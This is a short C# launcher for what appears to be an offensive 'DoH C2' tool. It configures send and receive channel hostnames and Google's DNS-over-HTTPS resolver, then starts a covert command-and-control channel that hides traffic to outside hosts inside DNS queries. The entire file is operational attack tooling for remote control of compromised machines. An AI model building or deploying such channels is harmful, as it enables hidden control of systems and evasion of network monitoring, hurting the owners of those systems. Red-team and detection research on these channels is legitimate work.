using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using ExternalC2;

namespace DoHC2Runner
{
    class Program
    {
        static void Main(string[] args)
        {
            DoHC2 doh = new DoHC2();
            // Send Channel Hostname
            // Receive Channel Hostname
            // DNS over HTTPS (DoH) Resolver
            doh.Configure("send.example.org","receive.example.org","dns.google.com");
            doh.Go();
        }
    }
}
